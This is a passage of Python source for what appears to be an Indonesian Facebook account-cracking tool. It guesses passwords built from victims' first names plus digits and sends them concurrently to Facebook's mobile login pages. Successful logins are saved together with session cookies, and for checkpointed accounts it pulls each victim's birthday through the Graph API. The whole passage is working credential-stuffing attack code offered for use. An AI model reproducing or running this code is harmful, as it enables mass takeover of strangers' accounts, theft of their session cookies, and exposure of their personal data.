        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_zugendro = open('ngoke.txt', 'r').read()
            except (KeyError, IOError):
            	_zugendro = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_zugendro,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,coki,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    zugendro = open('.ppk/.hayyuk.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,zugendro)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_zugendro = open('ngoke.txt', 'r').read()
            except (KeyError, IOError):
            	_zugendro = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_zugendro,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,coki,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    zugendro = open('.ppk/.hayyuk.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,zugendro)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __pler__(self):
        yan = raw_input('\n [*] method : ')
        if yan == '':
            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with mamank(max_workers=30) as (__anonim__):
            	for ngoke in self.id: # aries
                    try:
                        bb = ngoke.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz)>=6:
                            pwx = [ xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345" ]
                        elif len(xz)<=2:
                            pwx = [ xz[0]+"123", xz[0]+"1234", xz[0]+"12345" ]
                        elif len(xz)<=3:
                            pwx = [ xz[0]+"123", xz[0]+"12345" ]
                        else:
                            pwx = [ xz[0]+"123", xz[0]+"12345" ]
                        __anonim__.submit(self.__api__, bb[0], pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('2', '02'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with mamank(max_workers=30) as (__anonim__):
            	for ngoke in self.id: # aries
                    try:
                        bb = ngoke.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz)>=6:
                            pwx = [ xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345" ]
                        elif len(xz)<=2:
                            pwx = [ xz[0]+"123", xz[0]+"1234", xz[0]+"12345" ]
                        elif len(xz)<=3:
                            pwx = [ xz[0]+"123", xz[0]+"12345" ]
                        else:
                            pwx = [ xz[0]+"123", xz[0]+"12345" ]
                        __anonim__.submit(self.__mbasic__, bb[0], pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('3', '03'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with mamank(max_workers=30) as (__anonim__):
            	for ngoke in self.id: # aries
                    try:
                        bb = ngoke.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz)>=6:
                            pwx = [ xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345" ]
                        elif len(xz)<=2:
                            pwx = [ xz[0]+"123", xz[0]+"1234", xz[0]+"12345" ]
                        elif len(xz)<=3:
                            pwx = [ xz[0]+"123", xz[0]+"12345" ]
                        else:
                            pwx = [ xz[0]+"123", xz[0]+"12345" ]
                        __anonim__.submit(self.__mfb__, bb[0], pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)

        else:
            print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__pler__()

if __name__ == '__main__':
    os.system('git pull')
    hey_tayo()
